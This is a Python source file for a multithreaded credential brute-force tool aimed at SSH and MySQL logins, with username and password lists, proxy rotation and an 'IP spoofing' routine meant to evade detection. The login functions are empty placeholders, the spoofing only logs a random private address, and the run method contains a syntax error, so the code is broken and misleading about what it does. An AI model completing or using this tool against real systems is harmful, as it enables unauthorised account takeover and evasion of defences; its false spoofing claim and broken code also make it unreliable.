import argparse
import logging
import threading
import time
import socket
from queue import Queue
from typing import List
import random

# Initialize logging
logging.basicConfig(
    filename="brute_force.log",
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

class BruteForceTool:
    def __init__(self, target: str, port: int, protocol: str, username_list: List[str], password_list: List[str], max_threads: int, proxy_list: List[str] = None):
        self.target = target
        self.port = port
        self.protocol = protocol
        self.username_list = username_list
        self.password_list = password_list
        self.max_threads = max_threads
        self.proxy_list = proxy_list or []
        self.queue = Queue()
        self.successful_attempts = []
        self.failed_attempts = []
        self.proxy_index = 0
        self.lock = threading.Lock()
        self.current_ip = None

    def log_attempt(self, username, password, success):
        if success:
            logging.info(f"SUCCESS: {username}:{password}")
            self.successful_attempts.append((username, password))
        else:
            logging.debug(f"FAILED: {username}:{password}")
            self.failed_attempts.append((username, password))

    def set_proxy(self):
        if not self.proxy_list:
            return None
        with self.lock:
            proxy = self.proxy_list[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
        return proxy

    def spoof_ip(self):
        with self.lock:
            self.current_ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
            logging.info(f"Spoofed IP Address: {self.current_ip}")

    def brute_force_worker(self):
        while not self.queue.empty():
            username, password = self.queue.get()
            try:
                self.spoof_ip()  # Spoof IP before each attempt
                success = self.attempt_login(username, password)
                self.log_attempt(username, password, success)
                if success:
                    print(f"[+] Success: {username}:{password}")
            except Exception as e:
                logging.error(f"Error on {username}:{password} - {str(e)}")
            self.queue.task_done()

    def attempt_login(self, username, password):
        # Placeholder: Replace with real protocol logic
        if self.protocol.lower() == "ssh":
            return self.ssh_login(username, password)
        elif self.protocol.lower() == "mysql":
            return self.mysql_login(username, password)
        # Add other protocols here
        return False

    def ssh_login(self, username, password):
        # Placeholder logic for SSH login
        return False

    def mysql_login(self, username, password):
        # Placeholder logic for MySQL login
        return False

    def run(self):
        for username in self.username_list:
            for password in self.password_list:
                self.queue.put((username, password))

        threads = []
        for _ in range(self.max_threads:
            t = threading.Thread(target=self.brute_force_worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        self.generate_report()

    def generate_report(self):
        success_count = len(self.successful_attempts)
        failed_count = len(self.failed_attempts)
        logging.info(f"Total Successful Attempts: {success_count}")
        logging.info(f"Total Failed Attempts: {failed_count}")

        print("Brute Force Attack Completed")
        print(f"Successful Attempts: {success_count}")
        print(f"Failed Attempts: {failed_count}")
        print("Detailed logs available in brute_force.log")

# Argument parsing
def parse_args():
    parser = argparse.ArgumentParser(description="Advanced Brute Force Tool")
    parser.add_argument("target", type=str, help="Target IP or hostname")
    parser.add_argument("protocol", type=str, help="Protocol (ssh, mysql, etc.)")
    parser.add_argument("--port", type=int, required=True, help="Target port")
    parser.add_argument("--userlist", type=str, required=True, help="Path to username list")
    parser.add_argument("--passlist", type=str, required=True, help="Path to password list")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--proxylist", type=str, help="Path to proxy list (optional)")
    return parser.parse_args()

# Main function
def main():
    args = parse_args()

    with open(args.userlist, "r") as f:
        usernames = [line.strip() for line in f.readlines()]

    with open(args.passlist, "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    proxies = []
    if args.proxylist:
        with open(args.proxylist, "r") as f:
            proxies = [line.strip() for line in f.readlines()]

    tool = BruteForceTool(
        target=args.target,
        port=args.port,
        protocol=args.protocol,
        username_list=usernames,
        password_list=passwords,
        max_threads=args.threads,
        proxy_list=proxies,
    )

    tool.run()

if __name__ == "__main__":
    main()
